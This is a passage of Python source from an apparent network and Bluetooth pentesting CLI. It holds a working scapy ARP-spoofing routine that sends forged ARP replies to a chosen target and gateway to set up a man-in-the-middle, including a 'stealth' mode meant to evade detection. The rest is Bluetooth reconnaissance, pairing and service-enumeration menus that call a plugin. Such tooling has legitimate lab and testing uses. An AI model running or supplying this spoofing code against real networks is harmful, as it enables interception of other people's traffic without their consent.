        console.print("5. [magenta]Lab-Only MITM Test[/magenta] - Safe lab environment testing")
        console.print("6. [cyan]Simulation Mode[/cyan] - Packet analysis without actual spoofing")
    else:
        print("\nARP Spoofing Options:")
        print("1. Standard ARP Spoofing - Basic man-in-the-middle")
        print("2. Stealth Mode - Reduced packet rate to avoid detection")
        print("3. Aggressive Mode - High packet rate for testing")
        print("4. Detection Test - Test for firewall/IDS detection")
        print("5. Lab-Only MITM Test - Safe lab environment testing")
        print("6. Simulation Mode - Packet analysis without actual spoofing")
    
    mode = safe_input("Select mode (1-6): ")
    if not mode:
        return
    
    target_ip = safe_input("Enter target IP: ")
    if not target_ip or not validate_ip(target_ip):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid target IP address.[/red]")
        else:
            print(colored("Invalid target IP address.", Colors.FAIL))
        return
    
    gateway_ip = safe_input("Enter gateway IP: ")
    if not gateway_ip or not validate_ip(gateway_ip):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid gateway IP address.[/red]")
        else:
            print(colored("Invalid gateway IP address.", Colors.FAIL))
        return
    
    # Mode-specific settings with enhanced safety controls
    if mode == "1":
        mode_name = "Standard"
        packet_interval = 2
        stealth_mode = False
        simulation_mode = False
        max_duration = 300  # 5 minutes
    elif mode == "2":
        mode_name = "Stealth"
        packet_interval = 5
        stealth_mode = True
        simulation_mode = False
        max_duration = 600  # 10 minutes
    elif mode == "3":
        mode_name = "Aggressive"
        packet_interval = 0.5
        stealth_mode = False
        simulation_mode = False
        max_duration = 120  # 2 minutes
    elif mode == "4":
        mode_name = "Detection Test"
        packet_interval = 1
        stealth_mode = False
        simulation_mode = False
        max_duration = 180  # 3 minutes
    elif mode == "5":
        mode_name = "Lab-Only MITM Test"
        packet_interval = 3
        stealth_mode = True
        simulation_mode = False
        max_duration = 300  # 5 minutes
        # Additional safety checks for lab mode
        if RICH_AVAILABLE:
            console.print("[bold yellow]Lab-Only Mode Safety Features:[/bold yellow]")
            console.print("• Reduced packet rate for safety")
            console.print("• Automatic timeout after 5 minutes")
            console.print("• Enhanced monitoring and logging")
        else:
            print("Lab-Only Mode Safety Features:")
            print("• Reduced packet rate for safety")
            print("• Automatic timeout after 5 minutes")
            print("• Enhanced monitoring and logging")
    elif mode == "6":
        mode_name = "Simulation Mode"
        packet_interval = 1
        stealth_mode = False
        simulation_mode = True
        max_duration = 60  # 1 minute
        if RICH_AVAILABLE:
            console.print("[bold green]Simulation Mode:[/bold green]")
            console.print("• No actual ARP spoofing performed")
            console.print("• Packet analysis and monitoring only")
            console.print("• Safe for any network environment")
        else:
            print("Simulation Mode:")
            print("• No actual ARP spoofing performed")
            print("• Packet analysis and monitoring only")
            print("• Safe for any network environment")
    else:
        if RICH_AVAILABLE:
            console.print("[red]Invalid mode.[/red]")
        else:
            print(colored("Invalid mode.", Colors.FAIL))
        return
    
    if not safe_confirm(f"Are you sure you want to start {mode_name} ARP spoofing? This will affect network traffic."):
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Starting {mode_name} ARP Spoofing...[/bold green]")
        cli_manager.console.print(f"[cyan]Target:[/cyan] {target_ip}")
        cli_manager.console.print(f"[cyan]Gateway:[/cyan] {gateway_ip}")
        cli_manager.console.print(f"[cyan]Mode:[/cyan] {mode_name} (interval: {packet_interval}s)")
        cli_manager.console.print("[yellow]Press Ctrl+C to stop[/yellow]")
    else:
        print(f"\nStarting {mode_name} ARP Spoofing...")
        print(f"Target: {target_ip}")
        print(f"Gateway: {gateway_ip}")
        print(f"Mode: {mode_name} (interval: {packet_interval}s)")
        print("Press Ctrl+C to stop")
    
    # Get MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Could not get MAC addresses for target or gateway.[/red]")
        else:
            print(colored("Could not get MAC addresses for target or gateway.", Colors.FAIL))
        return
    
    # Detection monitoring
    detection_events = []
    start_time = time.time()
    
    try:
        packet_count = 0
        start_time = time.time()
        
        while True:
            # Check for timeout based on mode
            elapsed_time = time.time() - start_time
            if elapsed_time > max_duration:
                if RICH_AVAILABLE:
                    console.print(f"\n[bold yellow]⚠️  Timeout reached ({max_duration}s). Stopping for safety.[/bold yellow]")
                else:
                    print(f"\n⚠️  Timeout reached ({max_duration}s). Stopping for safety.")
                break
            
            if simulation_mode:
                # Simulation mode - only analyze packets, don't send
                if RICH_AVAILABLE:
                    console.print(f"\r[cyan]Simulation Mode:[/cyan] Analyzing network traffic | [yellow]Time: {elapsed_time:.1f}s[/yellow] | [green]Packets analyzed: {packet_count}[/green]", end='')
                else:
                    print(f"\rSimulation Mode: Analyzing network traffic | Time: {elapsed_time:.1f}s | Packets analyzed: {packet_count}", end='', flush=True)
                
                # Simulate packet analysis
                packet_count += 1
                time.sleep(packet_interval)
                continue
            
            # Actual ARP spoofing (modes 1-5)
            # Spoof target telling it we are the gateway
            arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            scapy.send(arp_response, verbose=False)
            
            # Spoof gateway telling it we are the target
            arp_response = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            scapy.send(arp_response, verbose=False)
            
            packet_count += 2
            
            # Detection monitoring (mode 4)
            if mode == "4":
                # Monitor for potential detection responses
                try:
                    # Listen for ICMP messages that might indicate detection
                    sniff_result = scapy.sniff(iface=scapy.conf.iface, count=1, timeout=0.1, store=0)
                    for packet in sniff_result:
                        if scapy.ICMP in packet:
                            detection_events.append({
                                "time": time.time() - start_time,
                                "type": "ICMP Response",
                                "source": packet[scapy.IP].src,
                                "details": f"ICMP type {packet[scapy.ICMP].type}"
                            })
                except:
                    pass
            
            # Enhanced progress display with mode-specific information
            if RICH_AVAILABLE:
                if mode == "5":  # Lab-only mode
                    console.print(f"\r[cyan]Lab Mode:[/cyan] Packets sent: {packet_count} | [yellow]Time: {elapsed_time:.1f}s[/yellow] | [green]Mode: {mode_name}[/green] | [red]Timeout: {max_duration - elapsed_time:.1f}s[/red]", end='')
                else:
                    console.print(f"\r[cyan]Packets sent: {packet_count}[/cyan] | [yellow]Time: {elapsed_time:.1f}s[/yellow] | [green]Mode: {mode_name}[/green]", end='')
            else:
                if mode == "5":  # Lab-only mode
                    print(f"\rLab Mode: Packets sent: {packet_count} | Time: {elapsed_time:.1f}s | Mode: {mode_name} | Timeout: {max_duration - elapsed_time:.1f}s", end='', flush=True)
                else:
                    print(f"\rPackets sent: {packet_count} | Time: {elapsed_time:.1f}s | Mode: {mode_name}", end='', flush=True)
            
            time.sleep(packet_interval)
            
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print(f"\n\n[bold yellow]⚠️  ARP spoofing stopped by user.[/bold yellow]")
            console.print(f"[cyan]Total packets sent: {packet_count}[/cyan]")
        else:
            print(f"\n\n⚠️  ARP spoofing stopped by user.")
            print(f"Total packets sent: {packet_count}")
        
        # Enhanced summary for different modes
        if simulation_mode:
            if RICH_AVAILABLE:
                console.print(f"[green]Simulation Mode Summary:[/green]")
                console.print(f"• Packets analyzed: {packet_count}")
                console.print(f"• Duration: {elapsed_time:.1f} seconds")
                console.print(f"• Safe analysis completed")
            else:
                print(f"Simulation Mode Summary:")
                print(f"• Packets analyzed: {packet_count}")
                print(f"• Duration: {elapsed_time:.1f} seconds")
                print(f"• Safe analysis completed")
        elif mode == "5":  # Lab-only mode
            if RICH_AVAILABLE:
                console.print(f"[green]Lab-Only Mode Summary:[/green]")
                console.print(f"• Packets sent: {packet_count}")
                console.print(f"• Duration: {elapsed_time:.1f} seconds")
                console.print(f"• Safety timeout: {max_duration}s")
                console.print(f"• Lab environment testing completed")
            else:
                print(f"Lab-Only Mode Summary:")
                print(f"• Packets sent: {packet_count}")
                print(f"• Duration: {elapsed_time:.1f} seconds")
                print(f"• Safety timeout: {max_duration}s")
                print(f"• Lab environment testing completed")
        
        # Display detection results
        if mode == "4" and detection_events:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[bold red]Detection Events Found ({len(detection_events)}):[/bold red]")
                
                table = Table(title="Detection Events", show_header=True, header_style="bold magenta")
                table.add_column("Time", style="cyan", no_wrap=True)
                table.add_column("Type", style="yellow")
                table.add_column("Source", style="green")
                table.add_column("Details", style="white")
                
                for event in detection_events:
                    table.add_row(
                        f"{event['time']:.1f}s",
                        event['type'],
                        event['source'],
                        event['details']
                    )
                
                cli_manager.console.print(table)
            else:
                print(f"\nDetection Events Found ({len(detection_events)}):")
                for event in detection_events:
                    print(f"  {event['time']:.1f}s - {event['type']} from {event['source']}: {event['details']}")
        elif mode == "4":
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[bold green]✓ No detection events found[/bold green]")
            else:
                print(f"\n✓ No detection events found")
        
        # Restore ARP tables
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[yellow]Restoring ARP tables...[/yellow]")
        else:
            print("Restoring ARP tables...")
        
        try:
            for i in range(4):
                arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
                scapy.send(arp_response, verbose=False)
                arp_response = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
                scapy.send(arp_response, verbose=False)
                time.sleep(1)
            
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[green]✓ ARP tables restored.[/green]")
            else:
                print("✓ ARP tables restored.")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[red]Error restoring ARP tables: {e}[/red]")
            else:
                print(f"Error restoring ARP tables: {e}")

def get_mac(ip):
    """Get MAC address for given IP."""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.sr(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except:
        return None

def bluetooth_tools_menu():
    """Bluetooth tools menu."""
    while True:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("📱 Bluetooth Tools", style="bold blue"))
        else:
            print("\n📱 Bluetooth Tools")
            print("=" * 50)
        
        options = [
            (1, "Phase 1: Reconnaissance", "Comprehensive device discovery and metadata collection"),
            (2, "Scan Bluetooth Devices", "Discover nearby Bluetooth devices"),
            (3, "BLE Scan (Windows)", "Use Bleak for BLE device scanning"),
            (4, "Get Bluetooth Adapter Info", "Get local Bluetooth adapter information"),
            (5, "Test Bluetooth Pairing", "Test pairing with a Bluetooth device"),
            (6, "Enumerate Bluetooth Services", "List services on a Bluetooth device"),
            (7, "Bluetooth Security Scan", "Perform security analysis of Bluetooth devices"),
            (8, "Enhanced Security Check", "Advanced security analysis with scoring"),
            (9, "Automated Discovery & Test", "Automated testing of discovered devices"),
            (10, "Export Results", "Save scan results to JSON/CSV"),
            (11, "CLI Interface Demo", "Demonstrate CLI capabilities"),
            (0, "Back to Main Menu", "Return to main menu")
        ]
        
        cli_manager.print_menu(options)
        choice = cli_manager.get_choice("Select an option")
        
        if not choice:
            continue
        
        if choice == "0":
            break
        elif choice == "1":
            _run_bluetooth_reconnaissance()
        elif choice == "2":
            _scan_bluetooth_devices()
        elif choice == "3":
            _scan_ble_devices()
        elif choice == "4":
            _get_bluetooth_adapter_info()
        elif choice == "5":
            _test_bluetooth_pairing()
        elif choice == "6":
            _enumerate_bluetooth_services()
        elif choice == "7":
            _bluetooth_security_scan()
        elif choice == "8":
            _enhanced_security_check()
        elif choice == "9":
            _automated_discovery_test()
        elif choice == "10":
            _export_bluetooth_results()
        elif choice == "11":
            _bluetooth_cli_demo()


def _scan_bluetooth_devices():
    """Scan for Bluetooth devices."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Scanning for Bluetooth devices...", style="bold yellow"))
    else:
        print("Scanning for Bluetooth devices...")
    
    timeout = safe_input("Enter scan timeout (seconds, default: 10)")
    if not timeout:
        timeout = 10
    else:
        try:
            timeout = int(timeout)
        except ValueError:
            timeout = 10
    
    # Try to use plugin if available
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "scan_bluetooth_devices", timeout)
        if result:
            _display_bluetooth_scan_results(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Bluetooth scan failed", style="bold red"))
            else:
                print("Bluetooth scan failed")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _get_bluetooth_adapter_info():
    """Get Bluetooth adapter information."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Getting Bluetooth adapter information...", style="bold yellow"))
    else:
        print("Getting Bluetooth adapter information...")
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "get_bluetooth_info")
        if result:
            _display_bluetooth_adapter_info(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Failed to get Bluetooth adapter information", style="bold red"))
            else:
                print("Failed to get Bluetooth adapter information")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _test_bluetooth_pairing():
    """Test Bluetooth pairing."""
    mac_address = safe_input("Enter target MAC address (e.g., 00:11:22:33:44:55): ")
    if not mac_address:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("No MAC address specified", style="bold red"))
        else:
            print("No MAC address specified")
        return
    
    timeout = safe_input("Enter pairing timeout (seconds, default: 30): ")
    if not timeout:
        timeout = 30
    else:
        try:
            timeout = int(timeout)
        except ValueError:
            timeout = 30
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel(f"Testing Bluetooth pairing with {mac_address}...", style="bold yellow"))
    else:
        print(f"Testing Bluetooth pairing with {mac_address}...")
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "test_bluetooth_pairing", mac_address, timeout)
        if result:
            _display_bluetooth_pairing_results(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Bluetooth pairing test failed", style="bold red"))
            else:
                print("Bluetooth pairing test failed")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _enumerate_bluetooth_services():
    """Enumerate Bluetooth services."""
    mac_address = safe_input("Enter target MAC address (e.g., 00:11:22:33:44:55): ")
    if not mac_address:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("No MAC address specified", style="bold red"))
        else:
            print("No MAC address specified")
        return
    
    timeout = safe_input("Enter enumeration timeout (seconds, default: 15): ")
    if not timeout:
        timeout = 15
    else:
        try:
            timeout = int(timeout)
        except ValueError:
            timeout = 15
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel(f"Enumerating Bluetooth services on {mac_address}...", style="bold yellow"))
    else:
        print(f"Enumerating Bluetooth services on {mac_address}...")
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "enumerate_bluetooth_services", mac_address, timeout)
        if result:
            _display_bluetooth_services_results(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Bluetooth service enumeration failed", style="bold red"))
            else:
                print("Bluetooth service enumeration failed")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _bluetooth_security_scan():
    """Perform Bluetooth security scan."""
    mac_address = safe_input("Enter target MAC address (e.g., 00:11:22:33:44:55): ")
    if not mac_address:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("No MAC address specified", style="bold red"))
        else:
            print("No MAC address specified")
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel(f"Performing Bluetooth security scan on {mac_address}...", style="bold yellow"))
    else:
        print(f"Performing Bluetooth security scan on {mac_address}...")
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "bluetooth_security_scan", mac_address)
        if result:
            _display_bluetooth_security_results(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Bluetooth security scan failed", style="bold red"))
            else:
                print("Bluetooth security scan failed")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _run_bluetooth_plugin_functions():
    """Run Bluetooth plugin functions directly."""
    if 'bluetooth_tools' not in plugin_manager.loaded_plugins:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")
        return
    
    plugin_info = plugin_manager.get_plugin_info("bluetooth_tools")
    if not plugin_info:
        cli_manager.print_panel("Could not get Bluetooth plugin information", "red")
        return
    
    cli_manager.print_panel("Available Bluetooth Functions:", "blue")
    functions = [f for f in plugin_info.get('functions', []) if f != 'plugin_info']
    
    for i, func in enumerate(functions, 1):
        cli_manager.console.print(f"{i}. {func}")
    
    choice = cli_manager.get_choice("Select function to execute")
    if not choice or not choice.isdigit():
        return
    
    try:
        func_index = int(choice) - 1
        if 0 <= func_index < len(functions):
            selected_func = functions[func_index]
            cli_manager.print_panel(f"Executing {selected_func}...", "yellow")
            
            # Execute the function
            result = plugin_manager.execute_plugin_function("bluetooth_tools", selected_func)
            if result:
                cli_manager.print_panel(f"Function {selected_func} executed successfully", "green")
                # Display result in a formatted way
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print_json(json.dumps(result, indent=2))
                else:
                    print(json.dumps(result, indent=2))
            else:
                cli_manager.print_panel(f"Function {selected_func} failed", "red")
        else:
            cli_manager.print_panel("Invalid function selection", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _display_bluetooth_scan_results(results):
    """Display Bluetooth scan results."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="Bluetooth Device Scan Results")
        table.add_column("MAC Address", style="cyan")
        table.add_column("Name", style="green")
        table.add_column("Discovered At", style="blue")
        
        for device in results.get('devices_found', []):
            table.add_row(
                device.get('mac_address', 'Unknown'),
                device.get('name', 'Unknown'),
                device.get('discovered_at', 'Unknown')
            )
        
        cli_manager.console.print(table)
        
        # Show summary
        cli_manager.print_panel(f"Scan completed in {results.get('scan_duration', 0):.2f}s. Found {len(results.get('devices_found', []))} devices.", "green")
    else:
        print("Bluetooth Device Scan Results:")
        for device in results.get('devices_found', []):
            print(f"  {device.get('mac_address', 'Unknown')} - {device.get('name', 'Unknown')}")
        print(f"Scan completed in {results.get('scan_duration', 0):.2f}s. Found {len(results.get('devices_found', []))} devices.")


def _display_bluetooth_adapter_info(results):
    """Display Bluetooth adapter information."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="Bluetooth Adapter Information")
        table.add_column("Adapter Name", style="cyan")
        table.add_column("Type", style="green")
        table.add_column("Status", style="blue")
        table.add_column("Address", style="yellow")
        
        for adapter_name, adapter_info in results.get('adapter_info', {}).items():
            table.add_row(
                adapter_name,
                adapter_info.get('type', 'Unknown'),
                adapter_info.get('status', 'Unknown'),
                adapter_info.get('address', 'Unknown')
            )
        
        cli_manager.console.print(table)
    else:
        print("Bluetooth Adapter Information:")
        for adapter_name, adapter_info in results.get('adapter_info', {}).items():
            print(f"  {adapter_name}: {adapter_info.get('type', 'Unknown')} - {adapter_info.get('status', 'Unknown')}")


def _display_bluetooth_pairing_results(results):
    """Display Bluetooth pairing test results."""
    if results.get('pairing_successful'):
        cli_manager.print_panel(f"✅ Pairing successful with {results.get('target_mac')}", "green")
    else:
        cli_manager.print_panel(f"❌ Pairing failed with {results.get('target_mac')}", "red")
    
    cli_manager.print_panel(f"Pairing time: {results.get('pairing_time', 0):.2f}s", "blue")


def _display_bluetooth_services_results(results):
    """Display Bluetooth services enumeration results."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="Bluetooth Services")
        table.add_column("Service Name", style="cyan")
        table.add_column("UUID", style="green")
        table.add_column("Port", style="blue")
        table.add_column("Protocol", style="yellow")
        
        for service in results.get('services_found', []):
            table.add_row(
                service.get('name', 'Unknown'),
                service.get('uuid', 'Unknown'),
                service.get('port', 'Unknown'),
                service.get('protocol', 'Unknown')
            )
        
        cli_manager.console.print(table)
        
        cli_manager.print_panel(f"Found {len(results.get('services_found', []))} services in {results.get('scan_duration', 0):.2f}s", "green")
    else:
        print("Bluetooth Services:")
        for service in results.get('services_found', []):
            print(f"  {service.get('name', 'Unknown')} - UUID: {service.get('uuid', 'Unknown')}")


def _display_bluetooth_security_results(results):
    """Display Bluetooth security scan results."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="Bluetooth Security Issues")
        table.add_column("Issue", style="cyan")
        table.add_column("Risk Level", style="red")
        table.add_column("Status", style="yellow")
        table.add_column("Recommendation", style="green")
        
        for issue in results.get('security_issues', []):
            table.add_row(
                issue.get('issue', 'Unknown'),
                issue.get('risk_level', 'Unknown'),
                issue.get('status', 'Unknown'),
                issue.get('recommendation', 'None')
            )
        
        cli_manager.console.print(table)
        
        # Show recommendations
        if results.get('recommendations'):
            cli_manager.print_panel("General Recommendations:", "blue")
            for rec in results.get('recommendations', []):
                cli_manager.console.print(f"• {rec}")
    else:
        print("Bluetooth Security Issues:")
        for issue in results.get('security_issues', []):
            print(f"  {issue.get('issue', 'Unknown')} - {issue.get('risk_level', 'Unknown')}")


def _scan_ble_devices():
    """Scan for BLE devices using Bleak."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Scanning for BLE devices...", style="bold yellow"))
    else:
        print("Scanning for BLE devices...")
    
    timeout = safe_input("Enter scan timeout (seconds, default: 10)")
    if not timeout:
        timeout = 10
    else:
        try:
            timeout = int(timeout)
        except ValueError:
            timeout = 10
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        # Try to call the async BLE scan function
        try:
            import asyncio
            result = asyncio.run(plugin_manager.execute_plugin_function("bluetooth_tools", "scan_ble_devices", timeout))
            if result and result.get("success"):
                _display_bluetooth_scan_results(result)
            else:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(Panel("BLE scan failed or Bleak not available", style="bold red"))
                else:
                    print("BLE scan failed or Bleak not available")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel(f"BLE scan error: {e}", style="bold red"))
            else:
                print(f"BLE scan error: {e}")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _enhanced_security_check():
    """Perform enhanced security check."""
    mac_address = safe_input("Enter target MAC address (e.g., 00:11:22:33:44:55): ")
    if not mac_address:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("No MAC address specified", style="bold red"))
        else:
            print("No MAC address specified")
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel(f"Performing enhanced security check on {mac_address}...", style="bold yellow"))
    else:
        print(f"Performing enhanced security check on {mac_address}...")
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "enhanced_security_check", mac_address)
        if result:
            _display_enhanced_security_results(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Enhanced security check failed", style="bold red"))
            else:
                print("Enhanced security check failed")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _automated_discovery_test():
    """Perform automated discovery and testing."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Automated Bluetooth Discovery & Testing", style="bold blue"))
    else:
        print("\nAutomated Bluetooth Discovery & Testing")
        print("=" * 40)
    
    timeout = safe_input("Enter scan timeout (seconds, default: 10)")
    if not timeout:
        timeout = 10
    else:
        try:
            timeout = int(timeout)
        except ValueError:
            timeout = 10
    
    test_pairing = safe_input("Test pairing with discovered devices? (y/n, default: n): ").lower() in ('y', 'yes')
    enumerate_services = safe_input("Enumerate services on discovered devices? (y/n, default: y): ").lower() in ('y', 'yes', '')
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel(f"Starting automated testing (timeout: {timeout}s)...", style="bold yellow"))
    else:
        print(f"Starting automated testing (timeout: {timeout}s)...")
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        result = plugin_manager.execute_plugin_function(
            "bluetooth_tools", 
            "automated_discovery_and_test", 
            timeout, 
            test_pairing, 
            enumerate_services
        )
        if result:
            _display_automated_test_results(result)
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Automated testing failed", style="bold red"))
            else:
                print("Automated testing failed")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _export_bluetooth_results():
    """Export Bluetooth scan results."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Export Bluetooth Results", style="bold blue"))
    else:
        print("\nExport Bluetooth Results")
        print("=" * 25)
    
    # First perform a scan
    timeout = safe_input("Enter scan timeout (seconds, default: 10)")
    if not timeout:
        timeout = 10
    else:
        try:
            timeout = int(timeout)
        except ValueError:
            timeout = 10
    
    if 'bluetooth_tools' in plugin_manager.loaded_plugins:
        # Perform scan
        result = plugin_manager.execute_plugin_function("bluetooth_tools", "scan_bluetooth_devices", timeout)
        
        if result and result.get("success"):
            # Get export format
            format_choice = safe_input("Export format (json/csv, default: json): ")
            if format_choice.lower() == 'csv':
                filename = safe_input("Enter filename (optional, default: auto-generated): ")
                if not filename:
                    filename = None
                saved_file = plugin_manager.execute_plugin_function("bluetooth_tools", "save_results_to_csv", result, filename)
            else:
                filename = safe_input("Enter filename (optional, default: auto-generated): ")
                if not filename:
                    filename = None
                saved_file = plugin_manager.execute_plugin_function("bluetooth_tools", "save_results_to_json", result, filename)
            
            if saved_file:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(Panel(f"Results exported to: {saved_file}", style="bold green"))
                else:
                    print(f"Results exported to: {saved_file}")
            else:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(Panel("Export failed", style="bold red"))
                else:
                    print("Export failed")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(Panel("Scan failed - cannot export results", style="bold red"))
            else:
                print("Scan failed - cannot export results")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel("Bluetooth tools plugin not available", style="bold red"))
        else:
            print("Bluetooth tools plugin not available")


def _run_bluetooth_reconnaissance():
    """Run comprehensive Bluetooth reconnaissance."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Running Bluetooth Reconnaissance...", style="bold yellow"))
    else:
        print("Running Bluetooth Reconnaissance...")
    
    try:
        # Import the reconnaissance module
        import sys
        sys.path.append('plugins')
        from bluetooth_reconnaissance import BluetoothReconnaissance
        import asyncio
        
        # Get scan parameters
        timeout = safe_input("Enter scan timeout (seconds, default: 15): ")
        if not timeout:
            timeout = 15
        else:
            try:
                timeout = int(timeout)
            except ValueError:
                timeout = 15
        
        format_choice = safe_input("Output format (json/csv/both, default: json): ").lower()
        if format_choice not in ['json', 'csv', 'both']:
            format_choice = 'json'
        
        filename = safe_input("Output filename (optional, press Enter for auto-generated): ")
        if not filename:
            filename = None
        
        # Run reconnaissance
        async def run_recon():
            recon = BluetoothReconnaissance()
            results = await recon.run_full_reconnaissance(timeout)
            
            # Save results
            saved_files = []
            if format_choice in ['json', 'both']:
                json_file = recon.save_results_json(filename + ".json" if filename else None)
                if json_file:
                    saved_files.append(json_file)
            
            if format_choice in ['csv', 'both']:
                csv_file = recon.save_results_csv(filename + ".csv" if filename else None)
                if csv_file:
                    saved_files.append(csv_file)
            
            # Display summary
            if cli_manager.enable_rich and RICH_AVAILABLE:
                from rich.table import Table
                table = Table(title="Reconnaissance Results")
                table.add_column("Metric", style="cyan")
                table.add_column("Value", style="green")
                
                table.add_row("Total Devices", str(results['summary']['total_devices']))
                table.add_row("Classic Devices", str(results['summary']['classic_devices']))
                table.add_row("BLE Devices", str(results['summary']['ble_devices']))
                table.add_row("Adapters Found", str(results['summary']['adapters_found']))
                table.add_row("Scan Duration", f"{results['summary']['scan_duration']:.2f}s")
                
